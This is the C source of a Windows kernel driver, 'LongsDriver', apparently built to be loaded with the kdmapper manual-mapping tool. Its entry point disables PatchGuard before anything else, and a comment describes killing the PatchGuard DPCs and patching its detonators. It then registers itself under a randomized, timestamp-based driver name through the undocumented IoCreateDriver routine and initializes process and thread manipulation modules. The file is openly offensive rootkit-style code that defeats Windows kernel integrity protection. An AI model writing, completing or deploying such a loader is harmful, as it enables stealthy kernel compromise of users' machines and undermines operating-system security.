#include "Device.h"
#include "Dispatch.h"
#include "ProcessModule.h"
#include "ThreadModule.h"
#include "Bypass.h"
#include <ntddk.h>

#define DEVICE_NAME L"\\Device\\LongsDriver"
#define SYMLINK_NAME L"\\DosDevices\\LongsDriver"

PDEVICE_OBJECT g_DeviceObject = NULL;

//
// IoCreateDriver is not declared in WDK headers; resolve it at runtime It is
// exported by ntoskrnl.exe under this exact name.
//
typedef NTSTATUS (*PIO_CREATE_DRIVER)(
    PUNICODE_STRING DriverName, PDRIVER_INITIALIZE InitializationFunction);

static PIO_CREATE_DRIVER ResolveIoCreateDriver(VOID) {
  UNICODE_STRING routineName = RTL_CONSTANT_STRING(L"IoCreateDriver");
  return (PIO_CREATE_DRIVER)MmGetSystemRoutineAddress(&routineName);
}

//
// Init routine invoked by IoCreateDriver with a valid DRIVER_OBJECT.
// Sets up device, symbolic link and dispatch routines, then initializes
// feature modules. Runs only in the kdmapper-loaded path.
//
static NTSTATUS MappedDeviceInit(_In_ PDRIVER_OBJECT DriverObject,
                                 _In_ PUNICODE_STRING RegistryPath) {
  UNREFERENCED_PARAMETER(RegistryPath);

  NTSTATUS status;
  UNICODE_STRING deviceName, symlinkName;

  DbgPrint("[LongsDriver] MappedDeviceInit start\n");

  // Init unload
  DriverObject->DriverUnload = DriverUnload;

  // Init Device Object
  RtlInitUnicodeString(&deviceName, DEVICE_NAME);
  status = IoCreateDevice(DriverObject,
                          0, // DeviceExtension size
                          &deviceName, FILE_DEVICE_UNKNOWN,
                          FILE_DEVICE_SECURE_OPEN, FALSE, &g_DeviceObject);

  if (!NT_SUCCESS(status)) {
    DbgPrint("[LongsDriver] IoCreateDevice failed: 0x%X\n", status);
    return status;
  }

  // When loaded through IoCreateDriver the I/O manager does not finish
  // device initialization for us (like it does for a normal service load),
  // so clear DO_DEVICE_INITIALIZING and enable buffered IO manually. See
  // Nidhogg's reflective-load branch for the same pattern.
  g_DeviceObject->Flags |= DO_BUFFERED_IO;
  g_DeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;

  // Init Symbolic Link
  RtlInitUnicodeString(&symlinkName, SYMLINK_NAME);
  status = IoCreateSymbolicLink(&symlinkName, &deviceName);

  if (!NT_SUCCESS(status)) {
    DbgPrint("[LongsDriver] IoCreateSymbolicLink failed: 0x%X\n", status);
    IoDeleteDevice(g_DeviceObject);
    return status;
  }

  // Regis Dispatch Routines
  DriverObject->MajorFunction[IRP_MJ_CREATE] = DispatchCreate;
  DriverObject->MajorFunction[IRP_MJ_CLOSE] = DispatchClose;
  DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchDeviceControl;

  // Init feature modules
  status = ProcessModuleInitialize();
  if (!NT_SUCCESS(status)) {
    DbgPrint("[LongsDriver] ProcessModuleInitialize failed: 0x%X\n", status);
    RtlInitUnicodeString(&symlinkName, SYMLINK_NAME);
    IoDeleteSymbolicLink(&symlinkName);
    IoDeleteDevice(g_DeviceObject);
    g_DeviceObject = NULL;
    return status;
  }

  status = ThreadModuleInitialize();
  if (!NT_SUCCESS(status)) {
    DbgPrint("[LongsDriver] ThreadModuleInitialize failed: 0x%X\n", status);
    ProcessModuleCleanup();
    RtlInitUnicodeString(&symlinkName, SYMLINK_NAME);
    IoDeleteSymbolicLink(&symlinkName);
    IoDeleteDevice(g_DeviceObject);
    g_DeviceObject = NULL;
    return status;
  }

  DbgPrint("[LongsDriver] Driver loaded successfully.\n");
  return STATUS_SUCCESS;
}

static NTSTATUS BuildUniqueDriverName(PUNICODE_STRING name) {
  static const WCHAR prefix[] = L"\\Driver\\LongsDriver_";
  const SIZE_T prefixBytes = (sizeof(prefix) - sizeof(WCHAR));
  LARGE_INTEGER now;
  UNICODE_STRING seqName;
  WCHAR seqBuffer[16];
  NTSTATUS status;

  if (name->MaximumLength < prefixBytes + sizeof(seqBuffer) * 2) {
    return STATUS_BUFFER_TOO_SMALL;
  }

  RtlCopyMemory(name->Buffer, prefix, prefixBytes);
  name->Length = (USHORT)prefixBytes;

  KeQuerySystemTime(&now);

  seqName.Buffer = seqBuffer;
  seqName.Length = 0;
  seqName.MaximumLength = sizeof(seqBuffer);

  status = RtlIntegerToUnicodeString((ULONG)(now.QuadPart & 0xFFFFFFFF), 16,
                                     &seqName);
  if (NT_SUCCESS(status)) {
    status = RtlAppendUnicodeStringToString(name, &seqName);
  }
  if (NT_SUCCESS(status) && (now.QuadPart >> 32)) {
    status =
        RtlIntegerToUnicodeString((ULONG)(now.QuadPart >> 32), 16, &seqName);
    if (NT_SUCCESS(status)) {
      status = RtlAppendUnicodeStringToString(name, &seqName);
    }
  }
  return status;
}

NTSTATUS DmEntry(_In_opt_ PDRIVER_OBJECT DriverObject,
                 _In_opt_ PUNICODE_STRING RegistryPath) {
  UNREFERENCED_PARAMETER(DriverObject);
  UNREFERENCED_PARAMETER(RegistryPath);

  //
  // Disable PatchGuard before anything else. This must run on PASSIVE_LEVEL
  // inside the freshly mapped image; it scans ntoskrnl (26100.4351), kills the
  // PG DPCs, patches Context7/MCA detonators and arms the NX barricade.
  //
  DbgPrint("[LongsDriver] DmEntry: disabling PatchGuard...\n");
  if (!BypassPatchGuard()) {
    DbgPrint("[LongsDriver] DmEntry: PatchGuard bypass failed\n");
    return STATUS_UNSUCCESSFUL;
  }

  PIO_CREATE_DRIVER IoCreateDriver = ResolveIoCreateDriver();
  UNICODE_STRING driverName;
  WCHAR driverNameBuffer[64];
  NTSTATUS status;

  if (IoCreateDriver == NULL) {
    DbgPrint("[LongsDriver] DmEntry: cannot resolve IoCreateDriver\n");
    return STATUS_INCOMPATIBLE_DRIVER_BLOCKED;
  }

  driverName.Buffer = driverNameBuffer;
  driverName.Length = 0;
  driverName.MaximumLength = sizeof(driverNameBuffer);

  status = BuildUniqueDriverName(&driverName);
  if (!NT_SUCCESS(status)) {
    DbgPrint("[LongsDriver] failed to build driver name: 0x%X\n", status);
    return status;
  }

  DbgPrint("[LongsDriver] IoCreateDriver name: %wZ\n", &driverName);

  status = IoCreateDriver(&driverName, &MappedDeviceInit);
  if (!NT_SUCCESS(status)) {
    DbgPrint("[LongsDriver] DmEntry: IoCreateDriver failed: 0x%X\n", status);
    return status;
  }

  return STATUS_SUCCESS;
}

//
// UNLOAD DRIVER function
//
VOID DriverUnload(PDRIVER_OBJECT DriverObject) {
  UNREFERENCED_PARAMETER(DriverObject);
  UNICODE_STRING symlinkName;

  DbgPrint("[LongsDriver] DriverUnload start\n");

  // Cleanup feature modules
  ProcessModuleCleanup();
  ThreadModuleCleanup();

  // Clean symbolic link
  RtlInitUnicodeString(&symlinkName, SYMLINK_NAME);
  IoDeleteSymbolicLink(&symlinkName);

  // Clean device object
  if (g_DeviceObject) {
    IoDeleteDevice(g_DeviceObject);
    g_DeviceObject = NULL;
  }

  DbgPrint("[LongsDriver] Driver unloaded.\n");
}